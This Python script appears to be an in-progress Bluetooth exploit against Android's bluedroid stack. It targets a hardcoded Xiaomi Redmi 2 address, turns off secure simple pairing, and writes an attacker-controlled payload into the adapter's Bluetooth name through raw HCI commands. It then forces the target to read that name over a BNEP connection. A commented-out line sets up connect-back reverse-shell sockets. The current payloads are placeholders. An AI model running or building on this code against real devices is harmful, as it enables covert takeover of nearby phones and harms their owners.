import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

from pwn import log

MAX_BT_NAME = 0xf8
BNEP_PSM = 15
SHELL_SCRIPT = b'touch /data/local/tmp/test'
XIAOMI_REDMI_2 = "A0:86:C6:65:6C:D8"


def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8') + payload.ljust(MAX_BT_NAME, b'\x00'))
    #os.system('sudo hciconfig hci0 name %s'%(binascii.unhexlify('a1')))
    raw_sock.close()
    time.sleep(1)
    #time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)
    
def main(src_hci, dst):
    #os.system('hciconfig %s sspmode 0' % (src_hci,))


    os.system('hciconfig %s down' % (src_hci))
    os.system('btmgmt ssp off')
    os.system('hciconfig %s up' % (src_hci))
    os.system('hcitool dc %s' % (dst,))

    #sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
    src = "E4:5E:37:2F:7A:3C"
    #print "TESTTESTTESTTEST"
    dst="A0:86:C6:65:6C:D8"
    set_bt_name("ATMO", src_hci, src, dst) # Set Name, REMOTE_NAME address search

if __name__ == '__main__':
    main(*sys.argv[1:])

